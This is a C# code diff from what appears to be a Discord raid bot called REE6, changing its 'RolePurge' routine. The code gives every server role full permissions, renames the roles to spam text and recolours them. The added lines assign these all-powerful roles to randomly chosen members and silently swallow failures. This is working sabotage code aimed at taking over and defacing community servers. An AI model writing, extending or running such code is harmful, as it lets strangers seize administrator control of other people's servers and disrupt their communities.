@@ -96,6 +96,7 @@ namespace REE6
         public static async Task RolePurge(IGuild guild)
         {
             ITextChannel statusChannel = await guild.CreateTextChannelAsync("REE6 Role Purge Progress", channel => channel.Position = 1);
+            int roleFails = 0;
 
             await statusChannel.SendMessageAsync("REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE Role Purge Operation Starting...");
             int roleNum = guild.Roles.Count;
@@ -108,9 +109,25 @@ namespace REE6
 
             foreach (IRole role in guild.Roles)
             {
-                await role.ModifyAsync(rolePerms => rolePerms.Permissions = GuildPermissions.All);
-                await role.ModifyAsync(roleName => roleName.Name = "REEEEEEEEEE Role! REEEEEEEEEE! Role!");
-                await role.ModifyAsync(roleColor => roleColor.Color = roleColors[random.Next(2)]);
+                try
+                {
+                    await role.ModifyAsync(rolePerms => rolePerms.Permissions = GuildPermissions.All);
+                    await role.ModifyAsync(roleName => roleName.Name = "REEEEEEEEEE Role! REEEEEEEEEE! Role!");
+                    await role.ModifyAsync(roleColor => roleColor.Color = roleColors[random.Next(2)]);
+                    var users = await guild.GetUsersAsync(CacheMode.AllowDownload);
+                    foreach (IGuildUser user in users)
+                    {
+                        if (random.Next(users.Count) == 0)
+                        {
+                            await user.AddRoleAsync(role);
+                        }
+                    }
+                }
+                catch
+                {
+                    roleFails++;
+                    roleNum -= 1;
+                }
             }
 
 /*            // Purge all existing roles
